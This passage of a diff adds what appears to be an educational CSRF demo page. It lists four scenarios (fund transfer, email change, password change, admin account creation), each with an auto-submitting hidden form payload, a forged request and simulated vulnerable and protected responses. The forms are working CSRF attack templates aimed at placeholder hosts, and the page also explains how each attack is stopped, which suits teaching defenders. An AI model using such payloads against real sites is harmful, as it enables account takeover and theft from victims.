+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;h2&gt;Please wait...&lt;/h2&gt;
+
+  &lt;form action="https://bank.com/transfer"
+        method="POST" style="display:none"&gt;
+    &lt;input name="to"       value="attacker_account"/&gt;
+    &lt;input name="amount"   value="10000"/&gt;
+    &lt;input name="currency" value="USD"/&gt;
+    &lt;!-- No csrf_token field --&gt;
+  &lt;/form&gt;
+
+&lt;/body&gt;&lt;/html&gt;`,
+    req:`POST /transfer HTTP/1.1
+Host: bank.com
+Cookie: session=VICTIM_SESSION_TOKEN  ← auto-attached
+Content-Type: application/x-www-form-urlencoded
+
+to=attacker_account&amount=10000&currency=USD`,
+    vuln:`HTTP 200 OK
+
+{
+  "status": "success",
+  "message": "$10,000 transferred",
+  "to": "attacker_account"
+}`,
+    safe:`HTTP 403 Forbidden
+
+{
+  "error": "CSRF token missing or invalid",
+  "detail": "csrf_token field required for all POST requests"
+}`,
+    verdict:'<strong>POST CSRF via auto-submitting hidden form!</strong> The page loaded, the form submitted instantly, and $10,000 was transferred. The protected server rejects the request because no CSRF token was present.'
+  },
+  email_change:{
+    label:'Change account email address',
+    evil:`&lt;!-- Sent via phishing email --&gt;
+&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="https://bank.com/account/email"
+        method="POST" style="display:none"&gt;
+    &lt;input name="new_email"    value="attacker@evil.com"/&gt;
+    &lt;input name="confirm_email" value="attacker@evil.com"/&gt;
+  &lt;/form&gt;
+  &lt;p&gt;Verifying your account...&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;`,
+    req:`POST /account/email HTTP/1.1
+Host: bank.com
+Cookie: session=VICTIM_SESSION_TOKEN
+
+new_email=attacker%40evil.com&confirm_email=attacker%40evil.com`,
+    vuln:`HTTP 200 OK
+
+{
+  "status": "success",
+  "message": "Email updated to attacker@evil.com",
+  "note": "Password reset emails now go to attacker!"
+}`,
+    safe:`HTTP 403 Forbidden
+
+{
+  "error": "CSRF validation failed",
+  "hint": "Token not bound to this session"
+}`,
+    verdict:'<strong>Account takeover via email change!</strong> Attacker changes the victim\'s email. Now they can trigger a password reset → receive reset email at their own address → log in as victim. Full account takeover without ever knowing the password.'
+  },
+  password:{
+    label:'Change password (no current password required)',
+    evil:`&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;form action="https://bank.com/account/password"
+        method="POST" style="display:none"&gt;
+    &lt;input name="new_password"     value="H4ck3d!123"/&gt;
+    &lt;input name="confirm_password" value="H4ck3d!123"/&gt;
+    &lt;!-- No current_password required — common mistake! --&gt;
+  &lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt;`,
+    req:`POST /account/password HTTP/1.1
+Host: bank.com
+Cookie: session=VICTIM_SESSION_TOKEN
+
+new_password=H4ck3d%21123&confirm_password=H4ck3d%21123`,
+    vuln:`HTTP 200 OK
+
+{
+  "status": "success",
+  "message": "Password changed successfully",
+  "note": "Attacker can now log in as victim"
+}`,
+    safe:`HTTP 403 Forbidden
+
+{
+  "error": "CSRF token missing",
+  "additional": "Password change also requires current_password"
+}`,
+    verdict:'<strong>Password change CSRF!</strong> Attacker sets a new password — victim locked out of their own account instantly. The secure server requires both a CSRF token AND the current password (so even if CSRF is bypassed, the attacker still can\'t change it without knowing the old one).'
+  },
+  admin:{
+    label:'Admin — add superadmin user',
+    evil:`&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+  &lt;!-- Target: an admin who visits a phishing page --&gt;
+  &lt;form action="https://bank.com/admin/users/create"
+        method="POST" style="display:none"&gt;
+    &lt;input name="username" value="backdoor"/&gt;
+    &lt;input name="email"    value="attacker@evil.com"/&gt;
+    &lt;input name="role"     value="superadmin"/&gt;
+  &lt;/form&gt;
+&lt;/body&gt;&lt;/html&gt;`,
+    req:`POST /admin/users/create HTTP/1.1
+Host: bank.com
+Cookie: admin_session=ADMIN_SESSION_TOKEN
+
+username=backdoor&email=attacker%40evil.com&role=superadmin`,
+    vuln:`HTTP 200 OK
+
+{
+  "status": "success",
+  "message": "Superadmin user 'backdoor' created",
+  "email": "attacker@evil.com",
+  "note": "Attacker now has permanent admin access"
+}`,
+    safe:`HTTP 403 Forbidden
+
+{
+  "error": "CSRF token required for admin actions",
+  "severity": "Admin endpoints have strict CSRF enforcement"
+}`,
+    verdict:'<strong>Admin CSRF — persistent backdoor!</strong> An admin visits the phishing page and unknowingly creates a superadmin account for the attacker. This gives permanent, persistent access to the entire system — even after the original session ends.'
+  }
+};
+
+function runDemo(){
+  const key=document.getElementById('scenario-select').value;
+  const s=SCENARIOS[key];
+  document.getElementById('evil-source').innerHTML=s.evil;
+  document.getElementById('forged-req').textContent=s.req;
+  document.getElementById('server-resp').innerHTML=
+    `<span style="color:#f87171;font-size:10px;font-weight:600">VULNERABLE:\n</span><span style="color:#f87171">${s.vuln}</span>\n\n<span style="color:#4ade80;font-size:10px;font-weight:600">PROTECTED:\n</span><span style="color:#4ade80">${s.safe}</span>`;
+  const v=document.getElementById('verdict');
+  v.className='result-box r-red';
+  v.innerHTML=s.verdict;
+}
+
+runDemo();
+</script>
+</body>
+</html>
